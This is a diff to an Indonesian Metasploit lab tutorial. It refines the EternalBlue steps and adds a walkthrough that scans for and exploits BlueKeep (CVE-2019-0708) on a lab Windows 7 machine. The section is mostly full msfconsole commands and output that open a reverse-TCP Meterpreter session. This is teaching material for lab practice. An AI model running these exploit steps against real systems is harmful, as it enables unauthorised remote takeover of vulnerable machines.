@@ -2983,6 +2983,8 @@ Bangg!!! kita berhasil mengesploit Windows 7, untuk perintah di dalam `meterpret
 
 Proses exploit Windows XP hampir sama dengan Windows 7 sebelumnya (pastikan sudah mencoba exploit Windows 7 dengan Eternalblue sebelumnya). Perbedaannya pada eternalblue di Windows XP kita harus menggunakan payload dan pastikan LHOST payload adalah IP Address Kali Linux kita.
 
+> Note: Windows XP tidak menggunakan Firewall atau proteksi lain.
+
 Scan:
 
 ```
@@ -3386,7 +3388,7 @@ RHOSTS => 192.168.1.5
 msf6 exploit(windows/smb/eternalblue_doublepulsar) >
 ```
 
-Dari options di atas yang perlu diperhatikan adalah versi dari windows target, jika versi 32bit maka bagian `PROCESSINJECT` dan bagian `Payload options (windows/meterpreter/reverse_tcp):` tidak ada perubahan. Karena target saya menggunakan Windows 7 64bit maka perubahan sebagai berikut:
+Dari options di atas yang perlu diperhatikan adalah versi dari windows target, jika versi __32bit__ maka bagian `PROCESSINJECT` dan bagian `Payload options (windows/meterpreter/reverse_tcp):` tidak ada perubahan. Karena target saya menggunakan Windows 7 __64bit__ maka perubahan sebagai pada bagian `PROCESSINJECT` opsi `wlms.exe` diganti dengan `lsass.exe` dan payload option `windows/meterpreter/reverse_tcp` diganti dengan `windows/x64/meterpreter/reverse_tcp`:
 
 ```
 msf6 exploit(windows/smb/eternalblue_doublepulsar) > set RHOSTS 192.168.1.5
@@ -3421,3 +3423,290 @@ meterpreter >
 ```
 
 Bangggg!!!!
+
+#### Exploit Windows 7 dengan BlueKeep
+
+BlueKeep ada dalam Protokol Desktop Jarak Jauh / Remote Desktop Protocol (RDP) yang digunakan oleh OS Microsoft Windows dan telah ditemukan vurnerability dan telah didokumentasikan (CVE-2019-0708), yang terdapat pada OS Windows:
+
+* Windows 2000
+* Windows Vista
+* Windows XP
+* Windows 7
+* Windows Server 2003
+* Windows Server 2003 R2
+* Windows Server 2008
+* Windows Server 2008 R2
+
+Seorang penyerang dapat memanfaatkan kerentanan ini untuk melakukan eksekusi kode jarak jauh pada sistem yang tidak memiliki proteksi, melalui port **3389**.
+
+> Baca juga: [https://www.cisa.gov/news-events/cybersecurity-advisories/aa19-168a](https://www.cisa.gov/news-events/cybersecurity-advisories/aa19-168a)
+
+Untuk mengaktifkan port __3389__ pada Windows 7, aktifkan Remote Desktop yang ada pada _Control Panel -> System and Security -> System -> Remote Settings -> Remote_.
+
+![Windows enable remote desktop](img/BlueKeep.png)
+
+Dari Kali Linux masuk ke dalam Metasploit console.
+
+```
+$ sudo msfconsole    
+
+Metasploit tip: Use the 'capture' plugin to start multiple 
+authentication-capturing and poisoning services
+                                                  
+IIIIII    dTb.dTb        _.---._
+  II     4'  v  'B   .'"".'/|\`.""'.
+  II     6.     .P  :  .' / | \ `.  :
+  II     'T;. .;P'  '.'  /  |  \  `.'
+  II      'T; ;P'    `. /   |   \ .'
+IIIIII     'YvP'       `-.__|__.-'
+
+I love shells --egypt
+
+
+       =[ metasploit v6.4.38-dev                          ]
++ -- --=[ 2468 exploits - 1273 auxiliary - 431 post       ]
++ -- --=[ 1478 payloads - 49 encoders - 13 nops           ]
++ -- --=[ 9 evasion                                       ]
+
+Metasploit Documentation: https://docs.metasploit.com/
+
+msf6 > search bluekeep
+
+Matching Modules
+================
+
+   #   Name                                                                Disclosure Date  Rank    Check  Description
+   -   ----                                                                ---------------  ----    -----  -----------
+   0   auxiliary/scanner/rdp/cve_2019_0708_bluekeep                        2019-05-14       normal  Yes    CVE-2019-0708 BlueKeep Microsoft Remote Desktop RCE Check
+   1     \_ action: Crash                                                  .                .       .      Trigger denial of service vulnerability
+   2     \_ action: Scan                                                   .                .       .      Scan for exploitable targets
+   3   exploit/windows/rdp/cve_2019_0708_bluekeep_rce                      2019-05-14       manual  Yes    CVE-2019-0708 BlueKeep RDP Remote Windows Kernel Use After Free
+   4     \_ target: Automatic targeting via fingerprinting                 .                .       .      .
+   5     \_ target: Windows 7 SP1 / 2008 R2 (6.1.7601 x64)                 .                .       .      .
+   6     \_ target: Windows 7 SP1 / 2008 R2 (6.1.7601 x64 - Virtualbox 6)  .                .       .      .
+   7     \_ target: Windows 7 SP1 / 2008 R2 (6.1.7601 x64 - VMWare 14)     .                .       .      .
+   8     \_ target: Windows 7 SP1 / 2008 R2 (6.1.7601 x64 - VMWare 15)     .                .       .      .
+   9     \_ target: Windows 7 SP1 / 2008 R2 (6.1.7601 x64 - VMWare 15.1)   .                .       .      .
+   10    \_ target: Windows 7 SP1 / 2008 R2 (6.1.7601 x64 - Hyper-V)       .                .       .      .
+   11    \_ target: Windows 7 SP1 / 2008 R2 (6.1.7601 x64 - AWS)           .                .       .      .
+   12    \_ target: Windows 7 SP1 / 2008 R2 (6.1.7601 x64 - QEMU/KVM)      .                .       .      .
+
+
+Interact with a module by name or index. For example info 12, use 12 or use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
+After interacting with a module you can manually set a TARGET with set TARGET 'Windows 7 SP1 / 2008 R2 (6.1.7601 x64 - QEMU/KVM)'
+
+msf6 > use 0
+
+[*] Using action Scan - view all 2 actions with the show actions command
+msf6 auxiliary(scanner/rdp/cve_2019_0708_bluekeep) > show options
+
+Module options (auxiliary/scanner/rdp/cve_2019_0708_bluekeep):
+
+   Name             Current Setting  Required  Description
+   ----             ---------------  --------  -----------
+   RDP_CLIENT_IP    192.168.0.100    yes       The client IPv4 address to report during connect
+   RDP_CLIENT_NAME  rdesktop         no        The client computer name to report during connect, UNSET = random
+   RDP_DOMAIN                        no        The client domain name to report during connect
+   RDP_USER                          no        The username to report during connect, UNSET = random
+   RHOSTS                            yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
+   RPORT            3389             yes       The target port (TCP)
+   THREADS          1                yes       The number of concurrent threads (max one per host)
+
+
+Auxiliary action:
+
+   Name  Description
+   ----  -----------
+   Scan  Scan for exploitable targets
+
+
+
+View the full module info with the info, or info -d command.
+
+msf6 auxiliary(scanner/rdp/cve_2019_0708_bluekeep) > set RHOSTS 192.168.1.7
+RHOSTS => 192.168.1.7
+msf6 auxiliary(scanner/rdp/cve_2019_0708_bluekeep) > show info
+
+       Name: CVE-2019-0708 BlueKeep Microsoft Remote Desktop RCE Check
+     Module: auxiliary/scanner/rdp/cve_2019_0708_bluekeep
+    License: Metasploit Framework License (BSD)
+       Rank: Normal
+  Disclosed: 2019-05-14
+
+Provided by:
+  National Cyber Security Centre
+  JaGoTu
+  zerosum0x0
+  Tom Sellers
+
+Module stability:
+ crash-safe
+
+Available actions:
+    Name   Description
+    ----   -----------
+    Crash  Trigger denial of service vulnerability
+=>  Scan   Scan for exploitable targets
+
+Check supported:
+  Yes
+
+Basic options:
+  Name             Current Setting  Required  Description
+  ----             ---------------  --------  -----------
+  RDP_CLIENT_IP    192.168.0.100    yes       The client IPv4 address to report during connect
+  RDP_CLIENT_NAME  rdesktop         no        The client computer name to report during connect, UNSET = random
+  RDP_DOMAIN                        no        The client domain name to report during connect
+  RDP_USER                          no        The username to report during connect, UNSET = random
+  RHOSTS           192.168.1.7      yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
+  RPORT            3389             yes       The target port (TCP)
+  THREADS          1                yes       The number of concurrent threads (max one per host)
+
+Description:
+  This module checks a range of hosts for the CVE-2019-0708 vulnerability
+  by binding the MS_T120 channel outside of its normal slot and sending
+  non-DoS packets which respond differently on patched and vulnerable hosts.
+  It can optionally trigger the DoS vulnerability.
+
+References:
+  https://nvd.nist.gov/vuln/detail/CVE-2019-0708
+  https://msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2019-0708
+  https://zerosum0x0.blogspot.com/2019/05/avoiding-dos-how-bluekeep-scanners-work.html
+
+Also known as:
+  BlueKeep
+
+
+View the full module info with the info -d command.
+
+msf6 auxiliary(scanner/rdp/cve_2019_0708_bluekeep) > run
+
+[+] 192.168.1.7:3389      - The target is vulnerable. The target attempted cleanup of the incorrectly-bound MS_T120 channel.
+[*] 192.168.1.7:3389      - Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+msf6 auxiliary(scanner/rdp/cve_2019_0708_bluekeep) > 
+```
+
+Dari perintah di atas kita melakukan auxiliary untuk melakukan scanning  untuk mengetahui target memiliki vurnerability, dan hasil dari output di atas `The target is vulnerable. The target attempted cleanup of the incorrectly-bound MS_T120 channel.`.
+
+Setelah melakukan scanning, selanjutnya kita akan melakukan exploit ke Windows 7 target:
+
+```
+msf6 > search bluekeep
+
+Matching Modules
+================
+
+   #   Name                                                                Disclosure Date  Rank    Check  Description
+   -   ----                                                                ---------------  ----    -----  -----------
+   0   auxiliary/scanner/rdp/cve_2019_0708_bluekeep                        2019-05-14       normal  Yes    CVE-2019-0708 BlueKeep Microsoft Remote Desktop RCE Check
+   1     \_ action: Crash                                                  .                .       .      Trigger denial of service vulnerability
+   2     \_ action: Scan                                                   .                .       .      Scan for exploitable targets
+   3   exploit/windows/rdp/cve_2019_0708_bluekeep_rce                      2019-05-14       manual  Yes    CVE-2019-0708 BlueKeep RDP Remote Windows Kernel Use After Free
+   4     \_ target: Automatic targeting via fingerprinting                 .                .       .      .
+   5     \_ target: Windows 7 SP1 / 2008 R2 (6.1.7601 x64)                 .                .       .      .
+   6     \_ target: Windows 7 SP1 / 2008 R2 (6.1.7601 x64 - Virtualbox 6)  .                .       .      .
+   7     \_ target: Windows 7 SP1 / 2008 R2 (6.1.7601 x64 - VMWare 14)     .                .       .      .
+   8     \_ target: Windows 7 SP1 / 2008 R2 (6.1.7601 x64 - VMWare 15)     .                .       .      .
+   9     \_ target: Windows 7 SP1 / 2008 R2 (6.1.7601 x64 - VMWare 15.1)   .                .       .      .
+   10    \_ target: Windows 7 SP1 / 2008 R2 (6.1.7601 x64 - Hyper-V)       .                .       .      .
+   11    \_ target: Windows 7 SP1 / 2008 R2 (6.1.7601 x64 - AWS)           .                .       .      .
+   12    \_ target: Windows 7 SP1 / 2008 R2 (6.1.7601 x64 - QEMU/KVM)      .                .       .      .
+
+
+Interact with a module by name or index. For example info 12, use 12 or use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
+After interacting with a module you can manually set a TARGET with set TARGET 'Windows 7 SP1 / 2008 R2 (6.1.7601 x64 - QEMU/KVM)'
+
+msf6 > use 5
+
+[*] Additionally setting TARGET => Windows 7 SP1 / 2008 R2 (6.1.7601 x64)
+[*] Using configured payload windows/x64/meterpreter/reverse_tcp
+msf6 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) > show options
+
+Module options (exploit/windows/rdp/cve_2019_0708_bluekeep_rce):
+
+   Name             Current Setting  Required  Description
+   ----             ---------------  --------  -----------
+   RDP_CLIENT_IP    192.168.0.100    yes       The client IPv4 address to report during connect
+   RDP_CLIENT_NAME  ethdev           no        The client computer name to report during connect, UNSET = random
+   RDP_DOMAIN                        no        The client domain name to report during connect
+   RDP_USER                          no        The username to report during connect, UNSET = random
+   RHOSTS           192.168.1.7      yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
+   RPORT            3389             yes       The target port (TCP)
+
+
+Payload options (windows/x64/meterpreter/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
+   LHOST     192.168.1.21     yes       The listen address (an interface may be specified)
+   LPORT     4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   1   Windows 7 SP1 / 2008 R2 (6.1.7601 x64)
+
+
+
+View the full module info with the info, or info -d command.
+
+msf6 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) > set RHOSTS 192.168.1.7
+RHOSTS => 192.168.1.7
+msf6 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) > show options
+
+Module options (exploit/windows/rdp/cve_2019_0708_bluekeep_rce):
+
+   Name             Current Setting  Required  Description
+   ----             ---------------  --------  -----------
+   RDP_CLIENT_IP    192.168.0.100    yes       The client IPv4 address to report during connect
+   RDP_CLIENT_NAME  ethdev           no        The client computer name to report during connect, UNSET = random
+   RDP_DOMAIN                        no        The client domain name to report during connect
+   RDP_USER                          no        The username to report during connect, UNSET = random
+   RHOSTS           192.168.1.7      yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
+   RPORT            3389             yes       The target port (TCP)
+
+
+Payload options (windows/x64/meterpreter/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
+   LHOST     192.168.1.21     yes       The listen address (an interface may be specified)
+   LPORT     4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   1   Windows 7 SP1 / 2008 R2 (6.1.7601 x64)
+
+
+
+View the full module info with the info, or info -d command.
+
+msf6 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) > run
+
+[*] Started reverse TCP handler on 192.168.1.21:4444 
+[*] 192.168.1.7:3389 - Running automatic check ("set AutoCheck false" to disable)
+[*] 192.168.1.7:3389 - Using auxiliary/scanner/rdp/cve_2019_0708_bluekeep as check
+[+] 192.168.1.7:3389      - The target is vulnerable. The target attempted cleanup of the incorrectly-bound MS_T120 channel.
+[*] 192.168.1.7:3389      - Scanned 1 of 1 hosts (100% complete)
+[+] 192.168.1.7:3389 - The target is vulnerable. The target attempted cleanup of the incorrectly-bound MS_T120 channel.
+[*] 192.168.1.7:3389 - Using CHUNK grooming strategy. Size 250MB, target address 0xfffffa8013200000, Channel count 1.
+[!] 192.168.1.7:3389 - <---------------- | Entering Danger Zone | ---------------->
+[*] 192.168.1.7:3389 - Surfing channels ...
+[*] 192.168.1.7:3389 - Lobbing eggs ...
+[*] 192.168.1.7:3389 - Forcing the USE of FREE'd object ...
+[!] 192.168.1.7:3389 - <---------------- | Leaving Danger Zone | ---------------->
+[*] Sending stage (203846 bytes) to 192.168.1.7
+[*] Meterpreter session 1 opened (192.168.1.21:4444 -> 192.168.1.7:49159) at 2025-01-02 23:13:15 +0800
+
+meterpreter > 
+```
+
+Bangggg!!!!.
